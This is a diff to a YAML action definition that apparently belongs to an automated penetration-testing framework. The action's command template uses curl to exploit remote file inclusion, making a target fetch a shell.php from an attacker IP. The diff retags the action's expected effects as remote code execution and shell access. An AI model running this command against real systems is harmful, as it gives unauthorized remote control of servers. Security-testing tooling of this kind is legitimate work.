@@ -6,9 +6,10 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: curl -s '{target_url}?page=http://{attacker_ip}/shell.php'
-parser: null
+parser: web_response_parser
 expected_effects:
-- action_completed
+- rce_achieved
+- shell_obtained
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
